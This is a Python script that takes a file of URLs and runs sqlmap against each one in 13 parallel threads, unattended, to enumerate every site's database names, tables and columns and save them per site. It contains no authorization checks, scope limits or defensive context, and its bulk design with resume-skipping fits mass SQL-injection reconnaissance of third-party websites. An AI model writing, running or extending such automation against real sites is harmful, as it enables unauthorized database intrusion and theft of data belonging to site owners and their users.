import subprocess
import threading
from queue import Queue
import os
import sys
import re
import glob

MAX_WORKERS = 13


def get_sitename(url):
    match = re.match(r"https?://([^/:]+)", url)
    if match:
        return match.group(1)
    return "unknown_site"


def run_sqlmap(url, output_queue):
    sitename = get_sitename(url)
    output_dir = "databases"
    tables_dir = "tables"
    os.makedirs(output_dir, exist_ok=True)
    os.makedirs(tables_dir, exist_ok=True)
    output_file = os.path.join(output_dir, f"{sitename}.txt")

    try:
        # Run sqlmap.py from the same directory as this script to fetch database names
        proc = subprocess.Popen(
            [sys.executable, "sqlmap.py", "-u", url, "--dbs", "--batch"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1)
        dbs = []
        in_db_section = False
        with open(output_file, "w", encoding="utf-8") as f:
            for line in proc.stdout:
                print(f"[{sitename}] {line.strip()}")
                f.write(line)
                if "[INFO] fetching database names" in line:
                    in_db_section = True
                if in_db_section and line.strip().startswith("[*]"):
                    dbs.append(line.strip()[4:])
                if in_db_section and not line.strip():
                    break
        proc.wait()
        # Write just the dbs summary after run
        with open(output_file, "a", encoding="utf-8") as f:
            f.write("\n---- Databases summary ----\n")
            if dbs:
                for db in dbs:
                    f.write(f"{db}\n")
            else:
                f.write("No databases found or access denied.\n")

        # For each db, find tables and columns
        for db in dbs:
            table_file = os.path.join(tables_dir, f"{sitename}_{db}.txt")
            with open(table_file, "w", encoding="utf-8") as tf:
                # Get tables for database
                tf.write(f"Database: {db}\n")
                tf.write("---- Tables ----\n")
                tables = []
                try:
                    proc_tables = subprocess.Popen([
                        sys.executable, "sqlmap.py", "-u", url, "-D", db,
                        "--tables", "--batch"
                    ],
                                                   stdout=subprocess.PIPE,
                                                   stderr=subprocess.STDOUT,
                                                   text=True,
                                                   bufsize=1)
                    in_table_section = False
                    for line in proc_tables.stdout:
                        tf.write(line)
                        if "[INFO] fetching tables for database" in line:
                            in_table_section = True
                        if in_table_section and line.strip().startswith("[*]"):
                            tablename = line.strip()[4:]
                            tables.append(tablename)
                        if in_table_section and not line.strip():
                            break
                    proc_tables.wait()
                except Exception as e:
                    tf.write(f"Error fetching tables: {e}\n")

                # For each table, get columns
                if tables:
                    tf.write("\n---- Columns ----\n")
                    for table in tables:
                        tf.write(f"Table: {table}\n")
                        try:
                            proc_columns = subprocess.Popen(
                                [
                                    sys.executable, "sqlmap.py", "-u", url,
                                    "-D", db, "-T", table, "--columns",
                                    "--batch"
                                ],
                                stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT,
                                text=True,
                                bufsize=1)
                            in_column_section = False
                            columns = []
                            for line in proc_columns.stdout:
                                tf.write(line)
                                if "[INFO] fetching columns for table" in line:
                                    in_column_section = True
                                if in_column_section and line.strip(
                                ).startswith("[*]"):
                                    col = line.strip()[4:]
                                    columns.append(col)
                                if in_column_section and not line.strip():
                                    break
                            proc_columns.wait()
                            if columns:
                                for col in columns:
                                    tf.write(f"    {col}\n")
                            else:
                                tf.write(
                                    "    No columns found or access denied.\n")
                        except Exception as e:
                            tf.write(f"    Error fetching columns: {e}\n")
                        tf.write("\n")
                else:
                    tf.write("No tables found or access denied.\n")

        output_queue.put((url, "done"))
    except Exception as e:
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(f"Error: {e}\n")
        output_queue.put((url, "error"))


def worker(url_queue, output_queue):
    while True:
        url = url_queue.get()
        if url is None:
            break
        run_sqlmap(url, output_queue)
        url_queue.task_done()


def main():
    if len(sys.argv) != 2:
        print("Usage: python sql.py urls.txt")
        sys.exit(1)
    urls_file = sys.argv[1]
    with open(urls_file, "r", encoding="utf-8") as f:
        urls = [line.strip() for line in f if line.strip()]

    # Create the tables directory if it doesn't exist
    tables_dir = "tables"
    os.makedirs(tables_dir, exist_ok=True)

    # Filter out URLs for which table data already exists
    urls_to_process = []
    for url in urls:
        sitename = get_sitename(url)
        # Check if any file matching 'sitename_*.txt' exists in 'tables/'
        existing_table_files = glob.glob(
            os.path.join(tables_dir, f"{sitename}_*.txt"))

        # Only skip if existing_table_files is NOT empty
        if existing_table_files:
            print(
                f"Skipping {url}: Tables already processed and saved in {tables_dir}/ for this site."
            )
        else:
            urls_to_process.append(url)

    if not urls_to_process:
        print("No new URLs to process.")
        sys.exit(0)

    url_queue = Queue()
    output_queue = Queue()
    threads = []

    for _ in range(MAX_WORKERS):
        t = threading.Thread(target=worker, args=(url_queue, output_queue))
        t.daemon = True
        t.start()
        threads.append(t)

    for url in urls_to_process:  # Use the filtered list
        url_queue.put(url)

    url_queue.join()

    # Stop workers
    for _ in threads:
        url_queue.put(None)
    for t in threads:
        t.join()

    print(
        "All URLs processed. Results are in the databases/ and tables/ directories."
    )


if __name__ == "__main__":
    main()
